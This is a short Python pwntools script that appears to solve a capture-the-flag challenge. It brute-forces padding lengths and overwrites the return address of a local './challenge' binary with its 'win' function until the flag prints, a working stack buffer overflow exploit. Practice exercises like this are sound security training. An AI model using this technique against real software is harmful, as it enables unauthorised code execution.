import os; os.chdir('..')

from pwn import *

# Try all of the payload lengths between 1 and 100 and find the smallest length that causes a crash
for count in range(1, 100):
  p = process('./challenge')

  payload  = b'a' * count
  payload += p64(p.elf.functions['win'].address)

  p.sendline(payload)
  output = p.recvall()

  # Check whether the exploit worked
  if b'flag{' in output:
    # It worked!
    print(output.split(b'\n')[1]) # Print out the flag nicely
    break
